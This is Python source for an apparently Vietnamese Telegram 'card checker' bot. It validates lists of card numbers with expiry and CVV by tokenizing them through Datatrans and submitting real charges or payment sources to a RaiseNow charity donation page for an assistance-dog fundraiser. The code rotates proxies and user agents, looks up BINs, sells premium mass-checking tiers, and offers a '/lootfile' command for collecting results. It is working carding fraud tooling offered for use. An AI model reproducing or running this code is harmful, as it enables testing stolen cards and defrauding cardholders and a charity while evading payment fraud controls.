        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Host": "pay.datatrans.com",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250806055626003241",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "en-US",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        base_payload = {
            "account_uuid": "14bd66de-7d3a-4d31-98cd-072193050b5f",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {"locale": "de", "first_name": first_name, "last_name": last_name},
            "raisenow_parameters": {
                "analytics": {"channel": "paylink", "user_agent": user_agent},
                "solution": {"uuid": "0a3ee5eb-f169-403a-b4b8-b8641fe2a07d", "name": "Ausbildung Assistenzhund f√ºr Christopher", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/bchqm?lng=de", "uuid": "self-service", "version": "2.16.0"},
                "integration": {"donation_receipt_requested": "false"}
            },
            "custom_parameters": {"campaign_id": "Ausbildung Assistenzhund f√ºr Christopher", "campaign_subid": ""},
            "payment_information": {"brand_code": "eca", "cardholder": cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano, "transaction_id": transaction_id},
            "profile": "30b982d3-d984-4ed7-bd0d-c23197edfd1c",
            "return_url": "https://donate.raisenow.io/bchqm?lng=de&rnw-view=payment_result"
        }

        if gate2_mode == 'charge':
            charge_value = _get_charge_value('2', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        else: # live mode
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 2 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 2 System Error: {e}", bin_info

def check_card(line, cancellation_event=None, custom_charge_amount=None):
    if cancellation_event and cancellation_event.is_set():
        return 'cancelled', line, 'User cancelled', {}

    parts = line.strip().split('|')
    cc, mes, ano, cvv = "", "", "", ""

    if len(parts) == 4:
        cc, mes, ano, cvv = [p.strip() for p in parts]
    elif len(parts) == 3:
        cc_part, date_part, cvv_part = [p.strip() for p in parts]
        if '/' in date_part:
            date_split = date_part.split('/')
            if len(date_split) == 2:
                cc, mes, ano, cvv = cc_part.strip(), date_split[0].strip(), date_split[1].strip(), cvv_part.strip()
            else:
                return 'invalid_format', line, "Invalid date format (mm/yy or mm/yyyy).", {}
        else:
            return 'invalid_format', line, "Missing '/' in the date part.", {}
    else:
        return 'invalid_format', line, "Invalid format (cc|mm|yy|cvv or cc|mm/yy|cvv).", {}

    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid:
        return 'invalid_format', line, error_message, {}

    try:
        year_str = ano.strip()
        if len(year_str) == 2:
            full_year = int(f"20{year_str}")
        elif len(year_str) == 4:
            full_year = int(year_str)
        else:
            full_year = 0 
        if full_year < datetime.now().year:
            return 'decline', line, 'EXPIRED_CARD_DECLINE', {}
    except ValueError:
        return 'invalid_format', line, "Invalid expiration year.", {}

    if len(ano) == 2: ano = f"20{ano}"
    
    session = requests.Session()
    
    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        try:
            proxy_str = random.choice(proxy_config["proxies"])
            proxy_dict = _format_proxy_for_requests(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
        except IndexError:
            logger.warning("Proxy list is empty but proxy usage is enabled.")
            pass
    
    bin_info = {}

    try:
        bin_to_check = cc[:6]
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_headers = {"user-agent": random_user_agent(), "Pragma": "no-cache", "Accept": "*/*"}
        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10, cancellation_event=cancellation_event)
        
        if error:
            return 'cancelled' if "cancelled" in error else 'error', line, f"BIN Check Error: {error}", {}
        
        if bin_response:
            response_text_lower = bin_response.text.lower()
            if "not found" in response_text_lower and ('"detail":' in response_text_lower or bin_response.status_code != 200):
                return 'decline', line, 'INVALID_BIN_DECLINE', {}
            
            if bin_response.status_code == 200:
                try:
                    data = bin_response.json()
                    if isinstance(data, dict):
                        bin_info.update(data)
                    else:
                        logger.warning(f"BIN API returned non-dictionary data for BIN {bin_to_check}: {data}")
                except json.JSONDecodeError:
                    logger.warning(f"Error parsing JSON from BIN check for BIN {bin_to_check}")

        
        country_name_str = bin_info.get('country_name') or ''
        if country_name_str.upper() == 'VIETNAM':
            return 'decline', line, 'VIETNAM_BIN_DECLINE', bin_info
        
        active_gate = get_active_gate()
        
        # --- C·∫¨P NH·∫¨T: Logic gate ƒë√£ ƒë∆∞·ª£c thay ƒë·ªïi ---
        if active_gate == 'dalink': # --- NEW: Call Multi-Link Checker ---
            return check_card_multi_link(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_multi_link_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '3':
            return check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate3_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '4':
            return check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)
        elif active_gate == '5':
            return check_card_gate5(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate5_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '6':
            return check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)
        elif active_gate == '7':
            return check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount)
        elif active_gate == '8':
            return check_card_gate8(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate8_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '9':
            return check_card_gate9(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate9_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '10':
            return check_card_gate10(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate10_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '11':
            return check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate11_mode, _get_charge_value, custom_charge_amount)
        elif active_gate == '12':
            return check_card_gate12(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate12_mode, _get_charge_value, custom_charge_amount)
        else:
            # Fallback cho c√°c gate v·∫´n c√≤n trong file ch√≠nh
            gate_functions = {
                '1': _check_card_gate1,
                '2': _check_card_gate2,
            }
            gate_func = gate_functions.get(active_gate)
            if gate_func:
                 return gate_func(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount)
            else:
                 # M·∫∑c ƒë·ªãnh v·ªÅ gate 6 b√™n ngo√†i n·∫øu active_gate kh√¥ng h·ª£p l·ªá
                 return check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)


    except Exception as e:
        logger.error(f"Unknown error in check_card for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Unknown System Error: {e}", bin_info

def check_card_with_retry(line, cancellation_event=None, custom_charge_amount=None):
    """
    Wrapper for check_card to retry on specific HTTP errors.
    Returns: status, original_line, full_response, bin_info, had_persistent_error (bool)
    """
    proxy_config = load_proxies()
    # Retry 20 times if proxy is on, otherwise 10 times.
    max_retries = 20 if proxy_config.get("enabled") and proxy_config.get("proxies") else 10

    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return 'cancelled', line, 'User cancelled', {}, False

        status, original_line, full_response, bin_info = check_card(line, cancellation_event, custom_charge_amount)
        
        is_http_error = (
            status == 'error' and 
            ("HTTP Error" in str(full_response) or "Proxy Error" in str(full_response) or "Connection Error" in str(full_response))
        )
        
        if is_http_error and proxy_config.get("enabled") and proxy_config.get("proxies"):
            logger.warning(f"Card {line} encountered a proxied HTTP error. Attempt {attempt + 1}/{max_retries}. Retrying in 2s...")
            time.sleep(2)
            continue
        else:
            return status, original_line, full_response, bin_info, False

    logger.error(f"Card {line} has a persistent HTTP error after {max_retries} attempts.")
    error_message = (
        f"Persistent HTTP/Proxy error after {max_retries} attempts. Both Request 1 (Tokenize) and Request 2 (Payment) "
        f"may have failed. Final response from the last attempt: {full_response}"
    )
    return 'error', line, error_message, {}, True


def create_progress_bar(current, total, length=10):
    if total == 0: return "[‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = '‚ñà' * filled_len + '‚ñë' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return ''
    try:
        return ''.join(chr(0x1F1E6 + ord(char.upper()) - ord('A')) for char in country_code)
    except Exception:
        return ''

# --- BOT COMMANDS ---
async def start(update, context):
    user = update.effective_user

    if user.id in load_users() or user.id == ADMIN_ID:
        await update.message.reply_text(f"**Ch√†o m·ª´ng tr·ªü l·∫°i, {user.first_name}!**\nS·ª≠ d·ª•ng /help ƒë·ªÉ xem c√°c l·ªánh c√≥ s·∫µn.")
    else:
        welcome_message = (
            "**Ch√†o m·ª´ng b·∫°n ƒë·∫øn v·ªõi Premium Card Checker Bot!** ü§ñ\n\n"
            "Bot n√†y s·ª≠ d·ª•ng `Charge Api Auth` m·∫°nh m·∫Ω ƒë·ªÉ cung c·∫•p d·ªãch v·ª• ki·ªÉm tra th·∫ª ch√≠nh x√°c.\n\n"
            "**Tr·∫°ng th√°i hi·ªán t·∫°i c·ªßa b·∫°n:** `GUEST`\n"
            f"ID Telegram c·ªßa b·∫°n: `{user.id}`\n\n"
            "**üåü N√¢ng c·∫•p l√™n Premium! üåü**\n"
            "M·ªü kh√≥a to√†n b·ªô ti·ªÅm nƒÉng c·ªßa bot v·ªõi t∆∞ c√°ch th√†nh vi√™n Premium:\n"
            "‚úÖ **Ki·ªÉm tra kh√¥ng gi·ªõi h·∫°n:** Kh√¥ng c√≥ gi·ªõi h·∫°n v·ªÅ s·ªë l∆∞·ª£ng th·∫ª b·∫°n c√≥ th·ªÉ ki·ªÉm tra.\n"
            "‚úÖ **H·ªó tr·ª£ ∆∞u ti√™n:** Nh·∫≠n tr·ª£ gi√∫p nhanh h∆°n t·ª´ qu·∫£n tr·ªã vi√™n.\n\n"
            f"ƒê·ªÉ c√≥ quy·ªÅn truy c·∫≠p v√† n√¢ng c·∫•p l√™n Premium, vui l√≤ng li√™n h·ªá v·ªõi qu·∫£n tr·ªã vi√™n k√®m theo ID c·ªßa b·∫°n: {ADMIN_USERNAME}"
        )
        await update.message.reply_text(welcome_message)

async def info(update, context):
    await update.message.reply_text(f"üÜî ID Telegram c·ªßa b·∫°n l√†: `{update.effective_user.id}`")

async def get_help_text(user: User):
    user_id = user.id
    user_mass_limit = get_user_limit(user_id)
    user_multi_limit = get_user_multi_limit(user_id)

    active_gate = get_active_gate()
    active_gate_name = get_formatted_gate_name(active_gate)
    gate_status_line = f"\n‚ÑπÔ∏è **C·ªïng ki·ªÉm tra th·∫ª hi·ªán t·∫°i:** `{active_gate_name}`"
    
    new_commands = (
        "\n**Ki·ªÉm tra Website:**\n"
        "üîπ `/site <website.com>`\n"
        "   - *M√¥ t·∫£:* Ki·ªÉm tra th√¥ng tin m·ªôt website (Gateway, Captcha, v.v.).\n\n"
        "üîπ `/sitem`\n"
        "   - *M√¥ t·∫£:* Ki·ªÉm tra nhi·ªÅu website c√πng l√∫c (t·ªëi ƒëa 10).\n"
    )

    texts = {
        "public": (
            "**Menu L·ªánh C√¥ng Khai** üõ†Ô∏è\n"
            "Ch√†o m·ª´ng! ƒê√¢y l√† c√°c l·ªánh c∆° b·∫£n b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng:\n\n"
            "üîπ `/start`\n"
            "   - *M√¥ t·∫£:* Kh·ªüi ƒë·ªông bot v√† l·∫•y ID Telegram c·ªßa b·∫°n.\n\n"
            "üîπ `/info`\n"
            "   - *M√¥ t·∫£:* L·∫•y nhanh l·∫°i ID Telegram c·ªßa b·∫°n.\n\n"
            "üîπ `/help`\n"
            "   - *M√¥ t·∫£:* Hi·ªÉn th·ªã menu tr·ª£ gi√∫p n√†y.\n\n"
            f"**N√¢ng c·∫•p l√™n Premium:**\nƒê·ªÉ s·ª≠ d·ª•ng c√°c t√≠nh nƒÉng ki·ªÉm tra kh√¥ng gi·ªõi h·∫°n, vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Menu L·ªánh Th√†nh Vi√™n** üë§\n"
            "B·∫°n ƒë√£ ƒë∆∞·ª£c c·∫•p quy·ªÅn! S·ª≠ d·ª•ng c√°c l·ªánh sau:\n\n"
            "**Ki·ªÉm tra Th·∫ª:**\n"
            "üîπ `/cs <card>`\n"
            "   - *M√¥ t·∫£:* Ki·ªÉm tra m·ªôt th·∫ª t√≠n d·ª•ng.\n\n"
            "üîπ `/bin <bin>`\n"
            "   - *M√¥ t·∫£:* L·∫•y th√¥ng tin cho m·ªôt BIN c·ªßa th·∫ª.\n\n"
            "üîπ `/multi`\n"
            f"   - *M√¥ t·∫£:* Ki·ªÉm tra nhi·ªÅu th·∫ª trong m·ªôt tin nh·∫Øn (t·ªëi ƒëa {user_multi_limit} th·∫ª).\n\n"
            "üîπ `/mass<threads>`\n"
            "   - *M√¥ t·∫£:* Ki·ªÉm tra danh s√°ch th·∫ª t·ª´ m·ªôt t·ªáp `.txt`.\n\n"
            "üîπ `/stop`\n"
            "   - *M√¥ t·∫£:* D·ª´ng t√°c v·ª• /mass ho·∫∑c /multi ƒëang ch·∫°y c·ªßa b·∫°n.\n"
            f"{new_commands}\n"
            f"üí≥ **Gi·ªõi h·∫°n /mass:** `{user_mass_limit}` d√≤ng/t·ªáp.\n"
            f"üåü **N√¢ng c·∫•p l√™n Premium:** Li√™n h·ªá {ADMIN_USERNAME} ƒë·ªÉ ki·ªÉm tra kh√¥ng gi·ªõi h·∫°n."
        )
    }

    admin_commands = (
        "**Menu L·ªánh Qu·∫£n tr·ªã vi√™n** üëë\n"
        "To√†n quy·ªÅn ki·ªÉm so√°t bot v·ªõi c√°c l·ªánh n√†y:\n\n"
        "**Qu·∫£n l√Ω Bot & Check:**\n"
        "üîπ `/on`, `/off` - B·∫≠t/t·∫Øt bot.\n"
        "üîπ `/status` - Ki·ªÉm tra tr·∫°ng th√°i c√°c c·ªïng thanh to√°n.\n"
        "üîπ `/gate [1-12]` - Thay ƒë·ªïi c·ªïng check ƒëang ho·∫°t ƒë·ªông.\n"
        "üîπ `/dalink` - B·∫≠t/t·∫Øt ch·∫ø ƒë·ªô check ƒëa link ƒë·∫∑c bi·ªát.\n"
        "üîπ `/setgate <id> <min> <max>` - ƒê·∫∑t ph·∫°m vi charge cho m·ªôt c·ªïng.\n"
        "üîπ `/stop <user_id>` - D·ª´ng t√°c v·ª• c·ªßa ng∆∞·ªùi d√πng.\n"
        "üîπ `/cs<amount> <card>` - Check v·ªõi s·ªë ti·ªÅn charge t√πy ch·ªânh.\n\n"
        "**Qu·∫£n l√Ω Link (Ch·∫ø ƒë·ªô ƒë·∫∑c bi·ªát):**\n"
        "üîπ `/addlink <link/list of links>` - Th√™m v√† x√°c th·ª±c link m·ªõi.\n"
        "üîπ `/deletelink` - Xem v√† x√≥a c√°c link ƒë√£ l∆∞u.\n\n"
        "**Qu·∫£n l√Ω Proxy:**\n"
        "üîπ `/onprx`, `/offprx` - B·∫≠t/T·∫Øt s·ª≠ d·ª•ng proxy.\n"
        "üîπ `/addprx <proxy>` - Th√™m v√† ki·ªÉm tra proxy m·ªõi.\n"
        "üîπ `/deleteprx` - Xem v√† x√≥a c√°c proxy hi·ªán c√≥.\n"
        "üîπ `/testprx` - Ki·ªÉm tra c√°c proxy ƒë√£ l∆∞u.\n\n"
        "**Qu·∫£n l√Ω Ng∆∞·ªùi d√πng & Tin nh·∫Øn:**\n"
        "üîπ `/add <user_id>`\n"
        "üîπ `/ban <user_id>`\n"
        "üîπ `/show` - Xem danh s√°ch ng∆∞·ªùi d√πng.\n"
        "üîπ `/send <user_id> <message>`\n"
        "üîπ `/sendall <message>`\n\n"
        "**Qu·∫£n l√Ω Gi·ªõi h·∫°n:**\n"
        "üîπ `/addlimit <user_id> <number>`\n"
        "üîπ `/addlimitmulti <user_id> <number>`\n\n"
        "**Gi√°m s√°t & L·ªãch s·ª≠:**\n"
        "üîπ `/active` - Xem c√°c t√°c v·ª• ƒëang ch·∫°y.\n"
        "üîπ `/showcheck` - Xem th·ªëng k√™ check c·ªßa ng∆∞·ªùi d√πng.\n"
        "üîπ `/lootfile <user_id>` - L·∫•y t·ªáp k·∫øt qu·∫£."
    )
    
    if user_id == ADMIN_ID:
        member_help_base = texts['member'].split('üí≥ **Gi·ªõi h·∫°n /mass:**')[0].strip()
        return f"{admin_commands}{gate_status_line}\n\n{member_help_base}"
    elif user_id in load_users():
        return f"{texts['member']}{gate_status_line}"
    else:
        return texts['public']

async def help_command(update, context):
    user = update.effective_user
    help_text = await get_help_text(user)
    await update.message.reply_text(help_text, disable_web_page_preview=True)

async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("S·ª≠ d·ª•ng: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0])
        users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"‚ÑπÔ∏è Ng∆∞·ªùi d√πng `{user_to_add}` ƒë√£ c√≥ trong danh s√°ch.")
        else:
            users.add(user_to_add)
            save_users(users)
            await update.message.reply_text(f"‚úÖ ƒê√£ th√™m ng∆∞·ªùi d√πng `{user_to_add}`.")
    except ValueError: await update.message.reply_text("‚ùå ID ng∆∞·ªùi d√πng kh√¥ng h·ª£p l·ªá.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("S·ª≠ d·ª•ng: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0])
        users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban)
            save_users(users)
            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
            if os.path.exists(user_log_dir):
                shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"üóë ƒê√£ x√≥a ng∆∞·ªùi d√πng `{user_to_ban}` v√† t·∫•t c·∫£ nh·∫≠t k√Ω c·ªßa h·ªç.")
        else:
            await update.message.reply_text(f"‚ÑπÔ∏è Kh√¥ng t√¨m th·∫•y ng∆∞·ªùi d√πng `{user_to_ban}`.")
    except ValueError: await update.message.reply_text("‚ùå ID ng∆∞·ªùi d√πng kh√¥ng h·ª£p l·ªá.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("üì≠ Danh s√°ch ng∆∞·ªùi d√πng tr·ªëng."); return
    
    message_lines = ["üë• **Danh s√°ch ID & Gi·ªõi h·∫°n Ng∆∞·ªùi d√πng:**\n"]
    for user_id in sorted(list(users)):
        limit_mass = get_user_limit(user_id)
        limit_multi = get_user_multi_limit(user_id)
        message_lines.append(f"- `{user_id}` | Mass: `{limit_mass}` | Multi: `{limit_multi}`")
        
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/addlimit <user_id> <lines_to_add>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá. Vui l√≤ng ƒë·∫£m b·∫£o ID v√† s·ªë l∆∞·ª£ng l√† s·ªë."); return

    limits = load_json_file(LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    
    await update.message.reply_text(f"‚úÖ **C·∫≠p nh·∫≠t Gi·ªõi h·∫°n /mass Th√†nh c√¥ng!**\n\n"
                                          f"üë§ **ID Ng∆∞·ªùi d√πng:** `{target_user_id_str}`\n"
                                          f"üìà **Gi·ªõi h·∫°n c≈©:** `{old_limit}`\n"
                                          f"‚ûï **ƒê√£ th√™m:** `{amount_to_add}`\n"
                                          f"üìä **T·ªïng m·ªõi:** `{new_limit}`")

async def add_multi_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/addlimitmulti <user_id> <cards_to_add>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá. Vui l√≤ng ƒë·∫£m b·∫£o ID v√† s·ªë l∆∞·ª£ng l√† s·ªë."); return

    limits = load_json_file(MULTI_LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MULTI_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(MULTI_LIMIT_FILE, limits)
    
    await update.message.reply_text(f"‚úÖ **C·∫≠p nh·∫≠t Gi·ªõi h·∫°n /multi Th√†nh c√¥ng!**\n\n"
                                          f"üë§ **ID Ng∆∞·ªùi d√πng:** `{target_user_id_str}`\n"
                                          f"üìà **Gi·ªõi h·∫°n c≈©:** `{old_limit}`\n"
                                          f"‚ûï **ƒê√£ th√™m:** `{amount_to_add}`\n"
                                          f"üìä **T·ªïng m·ªõi:** `{new_limit}`")

async def bin_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return

    if not context.args or not context.args[0].isdigit() or not (6 <= len(context.args[0]) <= 8):
        await update.message.reply_text("Vui l√≤ng cung c·∫•p m·ªôt BIN h·ª£p l·ªá (6-8 ch·ªØ s·ªë).\nS·ª≠ d·ª•ng: `/bin <bin_number>`")
        return
    
    bin_to_check = context.args[0]
    msg = await update.message.reply_text(f"‚è≥ ƒêang ki·ªÉm tra BIN `{bin_to_check}`...")

    try:
        session = requests.Session()
        ua = random_user_agent()
        session.headers.update({"User-Agent": ua})
        
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_response, error = make_request_with_retry(session, 'get', bin_url, timeout=10)

        if error or not bin_response or bin_response.status_code != 200 or "not found" in bin_response.text.lower():
            await msg.edit_text(f"‚ùå Kh√¥ng t√¨m th·∫•y th√¥ng tin cho BIN `{bin_to_check}`."); return

        bin_info = bin_response.json()

        brand = (bin_info.get('brand') or 'N/A').upper()
        card_type = (bin_info.get('type') or 'N/A').upper()
        level = (bin_info.get('level') or 'N/A').upper()
        bank = bin_info.get('bank') or 'None'
        country_name = (bin_info.get('country_name') or 'N/A').upper()
        country_code = bin_info.get('country_code')
        flag = get_flag_emoji(country_code)

        bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
        bin_info_line = " ‚Äì ".join(bin_info_parts)
        
        response_text = (
            f"üÜî **BIN:** {bin_info_line}\n"
            f"üèõÔ∏è **Ng√¢n h√†ng:** {bank}\n"
            f"üåê **Qu·ªëc gia:** {country_name} {flag}"
        )

        final_message = f"‚ÑπÔ∏è **Th√¥ng tin BIN:** `{bin_to_check}`\n\n{response_text}"
        await msg.edit_text(final_message)

    except json.JSONDecodeError:
        await msg.edit_text(f"‚ùå L·ªói ph√¢n t√≠ch d·ªØ li·ªáu t·ª´ API cho BIN `{bin_to_check}`.")
    except Exception as e:
        logger.error(f"Error in /bin: {e}", exc_info=True)
        await msg.edit_text(f"‚õîÔ∏è **L·ªói H·ªá th·ªëng:** `{e}`")

async def _process_single_check(update, context, line, custom_charge_amount=None):
    """Function to handle the check logic for both /cs and /cs<amount>"""
    msg = await update.message.reply_text("‚è≥ *ƒêang ki·ªÉm tra th·∫ª c·ªßa b·∫°n, vui l√≤ng ƒë·ª£i...*")
    start_time = time.time()
    try:
        status, original_line, full_response, bin_info = await asyncio.to_thread(
            check_card, line, custom_charge_amount=custom_charge_amount
        )
        duration = time.time() - start_time

        user = update.effective_user
        if status in ['error', 'unknown'] and user.id != ADMIN_ID:
            debug_info = f"üêû DEBUG ALERT (/cs from user {user.id}):\nCard: {original_line}\nResponse: {str(full_response)[:3500]}"
            await context.bot.send_message(chat_id=ADMIN_ID, text=debug_info)

        active_gate = get_active_gate()
        gate_name = get_formatted_gate_name(active_gate)
        
        if custom_charge_amount is not None:
            amount_in_usd = custom_charge_amount / 100.0
            gate_name = f"Custom Charge {amount_in_usd:.2f}$ (Gate {active_gate})"

        is_charge_mode = False
        if active_gate == 'dalink' and get_multi_link_mode()['mode'] == 'charge':
            is_charge_mode = True
        elif active_gate in ['4', '6']:
            is_charge_mode = True
        elif active_gate == '1' and get_gate1_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '2' and get_gate2_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '3' and get_gate3_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '5' and get_gate5_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '8' and get_gate8_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '9' and get_gate9_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '10' and get_gate10_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '11' and get_gate11_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '12' and get_gate12_mode() == 'charge':
            is_charge_mode = True

        if custom_charge_amount is not None:
            is_charge_mode = True

        if status == 'gate_dead':
            final_message = (f"**üí† K·∫æT QU·∫¢ KI·ªÇM TRA TH·∫∫ üí†**\n\n"
                             f"**üí≥ Th·∫ª:** `{original_line}`\n"
                             f"**üö¶ Tr·∫°ng th√°i: ‚ùå GATE DIE**\n"
                             f"**üí¨ Ph·∫£n h·ªìi:** `C·ªïng thanh to√°n hi·ªán ƒëang ng·ª´ng ho·∫°t ƒë·ªông (Forbidden). Vui l√≤ng li√™n h·ªá qu·∫£n tr·ªã vi√™n.`\n\n"
